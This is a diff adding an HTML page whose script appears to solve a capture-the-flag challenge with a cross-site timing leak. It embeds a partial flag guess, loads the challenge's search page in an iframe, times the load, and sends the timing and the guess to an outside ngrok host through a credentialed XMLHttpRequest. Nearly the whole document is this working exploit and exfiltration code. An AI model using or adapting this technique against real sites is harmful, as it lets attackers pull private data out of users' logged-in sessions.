@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+  <html>
+  <body>
+  <script>
+
+  var flag="fb{cr055_s173_L34|<5_4r3"
+  var url =  "http://challenges.fbctf.com:8082/search?query="+flag;
+
+    var iframe = document.createElement('iframe');
+  iframe.setAttribute('t1', (new Date()).getTime());
+  iframe.setAttribute('src',url);
+  iframe.onload = function () {
+      var t2 = (new Date()).getTime();
+      var out = ( t2 - parseInt(this.getAttribute('t1')));
+
+     var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function() {
+      if (this.readyState == 4 && this.status == 200) {
+        console.log('fucked');
+        }
+      };
+      xhttp.open("GET", "http://987bd815.ngrok.io/fbctf/send.php?time="+out+'&flag='+flag, true);
+      xhttp.withCredentials = true;
+      xhttp.send();
+
+  }
+  document.body.appendChild(iframe);
+
+
+  </script>
+  </html
+
+  
